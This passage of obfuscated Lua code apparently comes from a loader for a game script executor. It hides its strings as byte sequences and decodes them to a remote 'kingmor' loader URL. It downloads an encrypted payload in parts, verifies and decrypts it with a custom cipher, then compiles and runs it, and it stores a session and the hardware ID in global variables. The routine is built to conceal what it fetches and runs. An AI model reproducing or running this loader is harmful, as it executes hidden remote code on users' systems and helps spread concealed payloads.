      acc=acc*64+v
      bits=bits+6
      if bits>=8 then
        bits=bits-8
        local d=2^bits
        n=n+1
        out[n]=_eb3dae[math.floor(acc/d)%256]
        acc=acc%d
      end
    end
  end
  return table.concat(out)
end
local function _ec2cf3(s)
  local v=0.0
  for i=1,#s do v=v*16+tonumber(string.sub(s,i,i),16) end
  return v
end
local function _0c94a9(s)
  local h=0
  for i=1,#s do h=(h*33+string.byte(s,i))%4294967296 end
  return h
end
local function _15247f(S)
  local sa,pa=392207010,205
  local sb,pb=3629671875,66
  local MA,AA,LA=686171,-525451527,4962696
  local MB,AB,LB=286211,-746426791,8795188
  local KA={227,197,13,165,75,205,86,183,252,12,228,118,20,168,131,172,172,12,92,132,39,211,93,12,15,53,254,8,197,54,23,65}
  local KB={62,144,3,51,192,249,31,239,16,42,127,95,156,40,235,92,114,184,243,106,87,193,221,173,1,235,67,25,121,50,243,191}
  local out,n={},0
  for i=1,#S do
    local c=string.byte(S,i)
    sb=(MB*sb+AB)%4294967296
    local ksb=(sb%256+KB[((i-1)%32)+1]+((i*113+LB)%256)+pb)%256
    pb=c
    local mid=(_92400d[c]-ksb)%256
    sa=(MA*sa+AA)%4294967296
    local ksa=(sa%256+KA[((i-1)%32)+1]+((i*113+LA)%256)+pa)%256
    pa=mid
    local p=(_628f5b[mid]-ksa)%256
    n=n+1
    out[n]=_eb3dae[p]
  end
  return table.concat(out)
end
local _1204fe
do
  local np = _69f166
  local base = (string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112,47,97,112,105,47,108,111,97,100,101,114,47,99,50,101,102,51,99,56,98,98,98,52,54,56,101,46,108,117,97,63,112,97,99)..string.char(107,61,49,38,112,97,114,116,61)) .. "@@PARTNUM@@" .. string.char(38,100,116,111,107,61) .. _42bdec
  local single = (string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112,47,97,112,105,47,108,111,97,100,101,114,47,99,50,101,102,51,99,56,98,98,98,52,54,56,101,46,108,117,97,63,115,105,110)..string.char(103,108,101,61,49,38,100,116,111,107,61)) .. _42bdec
  local function take(res, err)
    if type(res) ~= "string" or #res < 9 then return nil, tostring(err or res or "empty") end
    local hx = string.sub(res, 1, 8)
    local okNum = true
    pcall(function() if tonumber(hx, 16) == nil then okNum = false end end)
    if not okNum then return nil, "message" end
    local want = _ec2cf3(hx)
    local body = string.sub(res, 9)
    if (_0c94a9(body) % 4294967296) ~= want then return nil, "checksum" end
    return body, nil
  end
  local function fetchAll()
    if _d517b5 == nil then return nil, string.char(110,111,32,108,111,97,100,101,114) end
    local res, err = _0b7b82(single)
    local body, why = take(res, err)
    if body == nil then return nil, why end
    if body ~= "" and (_0c94a9(body) % 4294967296) ~= _ec2cf3(_162696) then
      return nil, string.char(112,97,121,108,111,97,100,32,104,97,115,104)
    end
    return { body }
  end
  local got = {}
  local missing = nil
  for i = 1, np do
    local body, lastErr = nil, nil
    for attempt = 1, 6 do
      local res, err = _0b7b82(string.gsub(base, "@@PARTNUM@@", tostring(i)))
      if type(res) == "string" and #res == 0 then
        body = ""
        break
      end
      body, lastErr = take(res, err)
      if body ~= nil then break end
      if lastErr == "message" then _4eec69(string.char(68,101,108,105,118,101,114,121,32,114,101,106,101,99,116,101,100)) return end
      nap(0.25 * attempt)
    end
    if body == nil then
      missing = tostring(i)
      break
    end
    got[i] = body
  end
  if missing == nil then
    _1204fe = got
  else
    local all, why = fetchAll()
    if all == nil then
      _4eec69(string.char(68,111,119,110,108,111,97,100,32,102,97,105,108,101,100,32,112,97,114,116,32) .. missing)
      return
    end
    _1204fe = all
  end
end
local ok, plain, why = (function()
  local sh = _1204fe
  if type(sh) ~= "table" then return false, nil, string.char(110,111,32,112,97,121,108,111,97,100) end
  local parts = {}
  for i = 1, #sh do parts[#parts+1] = sh[i] end
  local joined = table.concat(parts)
  parts = nil
  sh = nil
  _1204fe = nil
  if #joined == 0 then return false, nil, string.char(101,109,112,116,121,32,112,97,121,108,111,97,100) end
  local expect = _ec2cf3(_162696)
  if expect ~= nil and (_0c94a9(joined) % 4294967296) ~= expect then
    return false, nil, string.char(112,97,121,108,111,97,100,32,99,104,101,99,107,115,117,109,32,109,105,115,109,97,116,99,104)
  end
  local raw = _300f8b(joined)
  joined = nil
  local out = (_15247f)(raw)
  raw = nil
  if type(out) ~= "string" or #out == 0 then return false, nil, string.char(100,101,99,114,121,112,116,32,102,97,105,108,101,100) end
  local ph = _ec2cf3(_6fc07b)
  if ph ~= nil and (_0c94a9(out) % 4294967296) ~= ph then
    return false, nil, string.char(105,110,116,101,103,114,105,116,121,32,109,105,115,109,97,116,99,104)
  end
  return true, out, nil
end)()
if not ok then
  _4eec69(string.char(80,97,121,108,111,97,100,32,101,114,114,111,114,58,32) .. tostring(why))
  return
end
do
  local sess = {ok = true, sid = string.char(99,50,101,102,51,99,56,98,98,98,52,54,56,101), scriptId = string.char(99,50,101,102,51,99,56,98,98,98,52,54,56,101), t = 0}
  pcall(function() if type(os) == "table" and type(os.clock) == "function" then sess.t = os.clock() end end)
  local function setg(name, value)
    pcall(function() if type(getgenv) == "function" then local g = getgenv() if type(g) == "table" then g[name] = value end end end)
    pcall(function() if type(_G) == "table" then _G[name] = value end end)
  end
  setg(string.char(95,75,77,95,65,85,84,72), sess)
  setg(string.char(95,75,77,95,83,73,68), sess.sid)
  setg(string.char(95,75,77,95,66,65,83,69), string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112))
  setg(string.char(95,75,77,95,72,87,73,68), hwid)
end
local fn, cerr = _7aea30[1](_d517b5, plain)
plain = nil
if type(fn) ~= "function" then
  warn(string.char(91,75,105,110,103,109,111,114,93,32,99,111,109,112,105,108,101,58,32) .. tostring(cerr))
  _4eec69(string.char(83,99,114,105,112,116,32,99,111,109,112,105,108,101,32,101,114,114,111,114))
  return
end
local rok, runErr = _7aea30[2](fn, false)
fn = nil
pcall(function() if collectgarbage then collectgarbage("collect") end end)
if not rok then warn(string.char(91,75,105,110,103,109,111,114,93,32,114,117,110,116,105,109,101,58,32) .. tostring(runErr)) end
